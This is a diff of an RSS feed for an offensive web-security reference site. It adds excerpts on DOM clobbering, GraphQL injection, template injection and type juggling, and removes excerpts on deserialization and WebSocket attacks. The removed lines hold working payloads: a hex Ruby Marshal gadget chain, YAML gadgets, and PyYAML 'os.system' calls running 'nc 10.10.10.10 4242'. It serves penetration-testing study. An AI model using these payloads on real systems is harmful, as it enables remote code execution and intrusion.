@@ -5,8 +5,48 @@
     <link>https://www.grayhatfreelancing.com/docs/</link>
     <description>Recent content in Docs on Gray Hat Freelancing</description>
     <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
     <copyright>2023</copyright>
-    <lastBuildDate>Thu, 06 Apr 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://www.grayhatfreelancing.com/docs/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 21 Jun 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://www.grayhatfreelancing.com/docs/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>DOM Clobbering</title>
+      <link>https://www.grayhatfreelancing.com/docs/dom_clobbering/</link>
+      <pubDate>Wed, 21 Jun 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/dom_clobbering/</guid>
+      <description>Dom Clobbering # DOM Clobbering is a technique where global variables can be overwritten or &amp;ldquo;clobbered&amp;rdquo; by naming HTML elements with certain IDs or names. This can cause unexpected behavior in scripts and potentially lead to security vulnerabilities.
+Summary # Lab Exploit References Lab # Lab: Exploiting DOM clobbering to enable XSS Lab: Clobbering DOM attributes to bypass HTML filters Lab: DOM clobbering test case protected by CSP Exploit # Exploitation requires any kind of HTML injection in the page.</description>
+    </item>
+    
+    <item>
+      <title>GraphQL Injection</title>
+      <link>https://www.grayhatfreelancing.com/docs/graphql_injection/</link>
+      <pubDate>Wed, 21 Jun 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/graphql_injection/</guid>
+      <description>GraphQL Injection # GraphQL is a query language for APIs and a runtime for fulfilling those queries with existing data. A GraphQL service is created by defining types and fields on those types, then providing functions for each field on each type
+Summary # GraphQL injection Summary Tools Enumeration Common GraphQL endpoints Identify an injection point Enumerate Database Schema via Introspection Enumerate Database Schema via Suggestions Enumerate the types&amp;rsquo; definition List path to reach a type Exploit Extract data Extract data using edges/nodes Extract data using projections Use mutations GraphQL Batching Attacks JSON list based batching Query name based batching Injections NOSQL injection SQL injection References Tools # swisskyrepo/GraphQLmap - Scripting engine to interact with a graphql endpoint for pentesting purposes doyensec/graph-ql - GraphQL Security Research Material doyensec/inql - A Burp Extension for GraphQL Security Testing dee-see/graphql-path-enum - Lists the different ways of reaching a given type in a GraphQL schema andev-software/graphql-ide - An extensive IDE for exploring GraphQL API&amp;rsquo;s mchoji/clairvoyancex - Obtain GraphQL API schema despite disabled introspection nicholasaleks/CrackQL - A GraphQL password brute-force and fuzzing utility nicholasaleks/graphql-threat-matrix - GraphQL threat framework used by security professionals to research security gaps in GraphQL implementations dolevf/graphql-cop - Security Auditor Utility for GraphQL APIs IvanGoncharov/graphql-voyager) - Represent any GraphQL API as an interactive graph Insomnia - Cross-platform HTTP and GraphQL Client Enumeration # Common GraphQL endpoints # Most of the time the graphql is located on the /graphql or /graphiql endpoint.</description>
+    </item>
+    
+    <item>
+      <title>Server-Side Template Injection</title>
+      <link>https://www.grayhatfreelancing.com/docs/server_side_template_injection/</link>
+      <pubDate>Wed, 21 Jun 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/server_side_template_injection/</guid>
+      <description>Server Side Template Injection # Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages
+Summary # Templates Injections Summary Tools Methodology ASP.NET Razor ASP.NET Razor - Basic injection ASP.NET Razor - Command execution Expression Language EL Expression Language EL - Basic injection Expression Language EL - One-Liner injections not including code execution Expression Language EL - Code Execution Java - Freemarker Freemarker - Basic injection Freemarker - Read File Freemarker - Code execution Freemarker - Sandbox bypass Groovy Groovy - Basic injection Groovy - Read and create File Groovy - HTTP request: Groovy - Command Execution Groovy - Sandbox Bypass JavaScript - Handlebars Handlebars - Command Execution Jade / Codepen Java Java - Basic injection Java - Retrieve the system’s environment variables Java - Retrieve /etc/passwd Django Templates Python - Jinja2 Jinja2 - Basic injection Jinja2 - Template format Jinja2 - Debug Statement Jinja2 - Dump all used classes Jinja2 - Dump all config variables Jinja2 - Read remote file Jinja2 - Write into remote file Jinja2 - Remote Code Execution Forcing output on blind RCE Exploit the SSTI by calling os.</description>
+    </item>
+    
+    <item>
+      <title>Type Juggling</title>
+      <link>https://www.grayhatfreelancing.com/docs/type_juggling/</link>
+      <pubDate>Wed, 21 Jun 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/type_juggling/</guid>
+      <description>Type Juggling # PHP is a loosely typed language, which means it tries to predict the programmer&amp;rsquo;s intent and automatically converts variables to different types whenever it seems necessary. For example, a string containing only numbers can be treated as an integer or a float. However, this automatic conversion (or type juggling) can lead to unexpected results, especially when comparing variables using the &amp;lsquo;==&amp;rsquo; operator, which only checks for value equality (loose comparison), not type and value equality (strict comparison).</description>
+    </item>
+    
     <item>
       <title>Insecure File Upload</title>
       <link>https://www.grayhatfreelancing.com/docs/insecure_file_uploads/</link>
@@ -263,48 +303,6 @@ Summary # Tools Basic exploitation 16 bits Unicode encoding UTF-8 Unicode encodi
       <guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/python/</guid>
       <description>Python Deserialization # In Python source code, look for: cPickle.loads pickle.loads _pickle.loads jsonpickle.decode Pickle # The following code is a simple example of using cPickle in order to generate an auth_token which is a serialized User object. :warning: import cPickle will only work on Python 2
 import cPickle from base64 import b64encode, b64decode class User: def __init__(self): self.username = &amp;#34;anonymous&amp;#34; self.password = &amp;#34;anonymous&amp;#34; self.rank = &amp;#34;guest&amp;#34; h = User() auth_token = b64encode(cPickle.</description>
-    </item>
-    
-    <item>
-      <title>Ruby Deserialization</title>
-      <link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/ruby/</link>
-      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/ruby/</guid>
-      <description>Ruby Deserialization # Marshal.load # Script to generate and verify the deserialization gadget chain against Ruby 2.0 through to 2.5
-for i in {0..5}; do docker run -it ruby:2.${i} ruby -e &amp;#39;Marshal.load([&amp;#34;0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446&amp;#34;].pack(&amp;#34;H*&amp;#34;)) rescue nil&amp;#39;; done Yaml.load # Vulnerable code
-require &amp;#34;yaml&amp;#34; YAML.load(File.read(&amp;#34;p.yml&amp;#34;)) Universal gadget for ruby &amp;lt;= 2.7.2:
---- !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::DependencyList specs: - !ruby/object:Gem::Source::SpecificFile spec: &amp;amp;1 !ruby/object:Gem::StubSpecification loaded_from: &amp;#34;|id 1&amp;gt;&amp;amp;2&amp;#34; - !ruby/object:Gem::Source::SpecificFile spec: Universal gadget for ruby 2.x - 3.</description>
-    </item>
-    
-    <item>
-      <title>Web Sockets Attacks</title>
-      <link>https://www.grayhatfreelancing.com/docs/web_sockets/</link>
-      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/web_sockets/</guid>
-      <description>Web Sockets # The WebSocket protocol allows a bidirectional and full-duplex communication between a client and a server
-Summary # Tools Exploit Using ws-harness.py Cross-Site WebSocket Hijacking (CSWSH) Labs References Tools # ws-harness.py Exploit # Using ws-harness.py # Start ws-harness to listen on a web-socket, and specify a message template to send to the endpoint.
-python ws-harness.py -u &amp;#34;ws://dvws.local:8080/authenticate-user&amp;#34; -m ./message.txt The content of the message should contains the [FUZZ] keyword.</description>
-    </item>
-    
-    <item>
-      <title>YAML Deserialization</title>
-      <link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/yaml/</link>
-      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/yaml/</guid>
-      <description>YAML Deserialization # Summary # Tools Exploit PyYAML ruamel.yaml Ruby SnakeYAML References Tools # j0lt-github/python-deserialization-attack-payload-generator artsploit/yaml-payload - A tiny project for generating SnakeYAML deserialization payloads mbechler/marshalsec Exploit # PyYAML # !!python/object/apply:time.sleep [10] !!python/object/apply:builtins.range [1, 10, 1] !!python/object/apply:os.system [&amp;#34;nc 10.10.10.10 4242&amp;#34;] !!python/object/apply:os.popen [&amp;#34;nc 10.10.10.10 4242&amp;#34;] !!python/object/new:subprocess [[&amp;#34;ls&amp;#34;,&amp;#34;-ail&amp;#34;]] !!python/object/new:subprocess.check_output [[&amp;#34;ls&amp;#34;,&amp;#34;-ail&amp;#34;]] !!python/object/apply:subprocess.Popen - ls !!python/object/new:str state: !!python/tuple - &amp;#39;print(getattr(open(&amp;#34;flag\x2etxt&amp;#34;), &amp;#34;read&amp;#34;)())&amp;#39; - !!python/object/new:Warning state: update: !!python/name:exec Since PyYaml version 6.0, the default loader for load has been switched to SafeLoader mitigating the risks against Remote Code Execution.</description>
-    </item>
-    
-    <item>
-      <title>.NET Insecure Deserialization</title>
-      <link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/dotnet/</link>
-      <pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/dotnet/</guid>
-      <description>.NET Serialization # Summary # Detection Tools Formatters XmlSerializer DataContractSerializer NetDataContractSerializer LosFormatter JSON.NET BinaryFormatter POP Gadgets References Detection # AAEAAD (Hex) = .NET deserialization BinaryFormatter FF01 (Hex) / /w (Base64) = .NET ViewState Example: AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=
-Tools # pwntester/ysoserial.net - Deserialization payload generator for a variety of .NET formatters $ cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s $ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini $ .</description>
     </item>
     
   </channel>
